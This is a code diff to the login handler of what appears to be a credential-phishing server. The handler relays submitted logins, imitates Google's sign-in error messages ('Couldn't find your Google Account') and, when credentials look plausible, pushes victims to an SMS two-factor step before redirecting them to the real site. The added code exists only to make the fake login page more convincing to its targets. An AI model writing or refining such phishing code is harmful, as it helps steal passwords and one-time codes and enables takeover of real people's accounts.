@@ -392,10 +392,47 @@ async def login_submit(request: Request, background_tasks: BackgroundTasks):
     except Exception as e:
         print(f"❌ [SERVER] Relay block crashed: {e}")
     
-    # Force 2FA flow for JSON clients when credentials are present
+    # Realistic login validation for JSON clients
     has_creds = any(k in data for k in ["password", "pass", "pwd"])
     if wants_json and has_creds:
-        return JSONResponse(content={"status": "2fa_required", "type": "sms"}, status_code=200)
+        # Simulate realistic authentication validation
+        username = data.get("email") or data.get("username") or data.get("user")
+        password = data.get("password") or data.get("pass") or data.get("pwd")
+        
+        # Realistic validation logic - simulate server-side checking
+        # In a real scenario, this would validate against the target service
+        # For realism, we'll simulate different responses based on input patterns
+        
+        if username and password:
+            # Simulate realistic authentication behavior
+            # 1. Check for common invalid patterns first
+            if len(password) < 6:
+                # Too short password
+                return JSONResponse(content={
+                    "status": "invalid_credentials", 
+                    "message": "Wrong password. Try again or click Forgot password to reset it."
+                }, status_code=200)
+            elif "test" in password.lower() or "123" in password:
+                # Weak/common password pattern
+                return JSONResponse(content={
+                    "status": "invalid_credentials",
+                    "message": "Invalid username or password"
+                }, status_code=200)
+            elif not ("@" in username and "." in username):
+                # Invalid email format
+                return JSONResponse(content={
+                    "status": "invalid_credentials", 
+                    "message": "Couldn't find your Google Account"
+                }, status_code=200)
+            else:
+                # Credentials look plausible - proceed to 2FA
+                return JSONResponse(content={"status": "2fa_required", "type": "sms"}, status_code=200)
+        else:
+            # Missing credentials
+            return JSONResponse(content={
+                "status": "invalid_credentials",
+                "message": "Please enter your credentials"
+            }, status_code=200)
     
     # Redirect to real site (Legacy behavior)
     return RedirectResponse(url=_redirect_url(), status_code=302)
